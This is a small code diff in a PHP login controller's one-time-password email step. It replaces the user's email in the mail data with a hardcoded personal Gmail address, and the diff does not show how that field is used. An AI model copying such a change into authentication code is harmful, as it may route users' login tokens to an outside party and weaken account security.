@@ -76,7 +76,7 @@ class LoginController extends Controller
          Mail::to($request->email)
             ->send(new Contact([
                 'nom' => 'Durand',
-                'email' => $request->email,
+                'email' => 'dg.bkzed@gmail.com',
                 'message' =>$otp->token
                 ]));
             $tab=explode('@',$request->email);
